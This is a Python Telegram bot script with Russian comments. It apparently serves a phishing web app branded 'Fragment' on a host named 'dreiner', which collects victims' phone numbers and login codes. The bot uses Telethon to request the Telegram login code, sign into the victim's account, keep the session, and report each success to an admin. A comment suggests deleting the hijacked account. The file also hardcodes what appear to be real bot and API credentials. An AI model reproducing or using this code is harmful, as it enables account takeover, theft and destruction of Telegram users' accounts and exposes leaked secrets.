import json, asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient

# --- ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com" # Убедись, что это ссылка на твой Render

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
temp_clients = {}

@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await bot.set_chat_menu_button(
        chat_id=message.chat.id,
        menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL))
    )
    await message.answer("🚀 Панель Fragment запущена!")

@dp.message(F.web_app_data)
async def handle_data(message: types.Message):
    data = json.loads(message.web_app_data.data)
    action = data.get("action")
    phone = data.get("phone")
    
    if action == "send_code":
        await message.answer(f"📩 Запрашиваю код для `{phone}`...")
        client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
        temp_clients[phone] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            await message.answer("✅ Код отправлен в Telegram!")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            
    elif action == "login_and_del":
        code = data.get("code")
        client = temp_clients.get(phone)
        await message.answer(f"⚙️ Вхожу в аккаунт `{phone}`...")
        try:
            await client.sign_in(phone, code)
            await message.answer(f"🔓 Вход в `{phone}` успешен!")
            # Тут можно добавить удаление через client.delete_account()
        except Exception as e:
            await message.answer(f"❌ Ошибка входа: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
